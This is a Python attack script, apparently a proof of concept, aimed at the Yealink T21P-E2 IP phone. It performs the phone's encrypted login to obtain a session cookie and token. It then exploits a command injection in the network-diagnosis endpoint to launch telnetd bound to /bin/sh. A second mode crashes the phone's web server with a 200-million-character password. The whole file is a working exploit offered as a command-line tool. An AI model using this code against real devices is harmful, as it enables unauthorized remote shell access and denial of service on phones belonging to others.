import argparse
import sys
from Crypto.Cipher import AES
from base64 import b64encode
from urllib.parse import quote
from urllib import request
from jsbn import RSAKey
from hashlib import md5
from random import uniform


def zero_padding(bytes):
    """
    Pad with 0x00
    :param bytes: data without padding
    :return: data with padding
    """
    bytes += b'\x00' * (16 - (len(bytes) % 16))
    return bytes


def login(username, password, host):
    """
    Retrieve login cookie from t21p
    :param username: valid username
    :param password: valid password
    :param host: IP address or hostname
    :return: cookie if successful, -1 if not
    """
    # get new cookie, modulus, exponent
    req = request.urlopen('http://' + host + '/servlet?m=mod_listener&p=login&q=loginForm&Random=' + str(uniform(0, 1)))
    dom = req.read().decode('utf-8')
    cookie = req.getheader('Set-Cookie').split('=')[1].split(';')[0]
    rsa_n = dom.split('g_rsa_n = "')[1].split('"')[0]
    rsa_e = dom.split('g_rsa_e = "')[1].split('"')[0]

    # generate session key and iv
    aeskey = md5(str(uniform(0, 1)).encode('utf-8'))
    aesiv = md5(str(uniform(0, 1)).encode('utf-8'))

    # rsa cipher
    rsa = RSAKey()
    rsa.setPublic(rsa_n, rsa_e)

    # aes cipher
    aes = AES.new(aeskey.digest(), AES.MODE_CBC, iv=aesiv.digest())

    # encrypt session key and iv
    aeskey_enc = rsa.encrypt(aeskey.hexdigest())
    aesiv_enc = rsa.encrypt(aesiv.hexdigest())

    # generate encrypted pwd field
    pwd_plain = str(uniform(0, 1)) + ';' + cookie + ';' + password
    pwd_padded = zero_padding(pwd_plain.encode('utf-8'))
    pwd_enc = b64encode(aes.encrypt(pwd_padded)).decode('utf-8')
    pwd_uri = quote(pwd_enc, safe='~()*!.\'')

    # do post request to login
    data = 'username=' + username + '&pwd=' + pwd_uri + '&rsakey=' + aeskey_enc + '&rsaiv=' + aesiv_enc
    req = request.Request('http://' + host + '/servlet?m=mod_listener&p=login&q=login&Rajax=' + str(uniform(0, 1)),
                          data=data.encode('utf-8'))
    req.add_header('Cookie', 'JSESSIONID=' + str(cookie))
    resp = request.urlopen(req, timeout=5).read()

    # check if authstatus == done
    if 'done' in str(resp):
        return cookie
    else:
        return -1


def get_token(host, cookie):
    """
    Retrieve token which is needed for some requests
    :param host: IP address or hostname of t21p
    :param cookie: valid login cookie
    :return: token
    """
    req = request.Request('http://' + host + '/servlet?m=mod_data&p=status&q=load')
    req.add_header('Cookie', 'JSESSIONID=' + cookie)
    resp = request.urlopen(req)
    dom = resp.read().decode('utf-8')
    return dom.split('g_strToken = "')[1].split('"')[0]


def start_telnet(host, cookie):
    """
    Start telnet server on t21p
    :param host: IP address or hostname
    :param cookie: valid login cookie
    :return: None
    """
    token = get_token(host, cookie)

    # command injection
    cmd = 'cmd=start ping 192.168.1.1;telnetd -l/bin/sh&token=' + token
    req = request.Request('http://' + host + '/servlet?m=mod_data&p=network-diagnosis&q=docmd',
                          data=cmd.encode('utf-8'))
    req.add_header('Cookie', 'JSESSIONID=' + cookie)
    resp = request.urlopen(req).read()

    if 'ping 192.168.1.1' in str(resp):
        print("Telnet server is running")
    else:
        print("Couldn't start telnet server")


def denial_of_service(host):
    """
    Crash t21p's webserver by injecting a long password
    :param host: IP address or hostname
    :return: None
    """
    death = 'A' * 200000000
    try:
        login('admin', death, host)
    except:
        print("Webserver is dead.")


def main():
    """
    Main: Parse arguments and do what the user wants
    :return: None
    """
    parser = argparse.ArgumentParser(description='Attacks the Yealink T21P-E2')
    parser.add_argument('-i', '--ip', help='hostname or IP of telephone', required=True)
    parser.add_argument('-u', '--user', required=('--telnet' in sys.argv or '-t' in sys.argv),
                        help='username for login')
    parser.add_argument('-p', '--password', required=('--telnet' in sys.argv or '-t' in sys.argv),
                        help='password for login')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-d', '--dos', action='store_true', help='Denial of Service')
    group.add_argument('-t', '--telnet', action='store_true', help='start telnet server')
    args = parser.parse_args()

    if args.dos == True:
        denial_of_service(args.ip)

    if args.telnet == True:
        cookie = login(args.user, args.password, args.ip)
        start_telnet(args.ip, cookie)


if __name__ == '__main__':
    main()
